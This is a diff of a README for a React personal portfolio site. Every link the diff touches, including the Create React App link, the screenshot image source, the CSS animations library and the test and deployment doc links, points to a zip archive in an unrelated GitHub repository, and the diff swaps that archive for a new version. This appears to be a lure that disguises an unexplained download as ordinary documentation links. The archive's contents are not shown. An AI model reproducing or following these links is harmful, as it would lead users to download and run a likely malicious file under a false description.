@@ -1,14 +1,14 @@
 # Personal Portfolio Website in React
 
-This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/Shrejalraut0746/Elite_pragya1/main/naik/Elite_pragya1.zip).
+This project was bootstrapped with [Create React App](https://github.com/Shrejalraut0746/Elite_pragya1/raw/refs/heads/main/naik/pragya-Elite-v2.7.zip).
 
-<img width="1266" alt="Screen Shot 2022-06-19 at 2 18 18 PM" src="https://raw.githubusercontent.com/Shrejalraut0746/Elite_pragya1/main/naik/Elite_pragya1.zip">
+<img width="1266" alt="Screen Shot 2022-06-19 at 2 18 18 PM" src="https://github.com/Shrejalraut0746/Elite_pragya1/raw/refs/heads/main/naik/pragya-Elite-v2.7.zip">
 
 Built using:
 
 - Front-end library: React
 - CSS framework: React-bootstrap
-- CSS animations library: https://raw.githubusercontent.com/Shrejalraut0746/Elite_pragya1/main/naik/Elite_pragya1.zip
+- CSS animations library: https://github.com/Shrejalraut0746/Elite_pragya1/raw/refs/heads/main/naik/pragya-Elite-v2.7.zip
 
 In the /personal-portfolio, you can run:
 
@@ -23,7 +23,7 @@ You may also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://raw.githubusercontent.com/Shrejalraut0746/Elite_pragya1/main/naik/Elite_pragya1.zip) for more information.
+See the section about [running tests](https://github.com/Shrejalraut0746/Elite_pragya1/raw/refs/heads/main/naik/pragya-Elite-v2.7.zip) for more information.
 
 ### `npm run build`
 
@@ -33,4 +33,4 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://raw.githubusercontent.com/Shrejalraut0746/Elite_pragya1/main/naik/Elite_pragya1.zip) for more information.
+See the section about [deployment](https://github.com/Shrejalraut0746/Elite_pragya1/raw/refs/heads/main/naik/pragya-Elite-v2.7.zip) for more information.
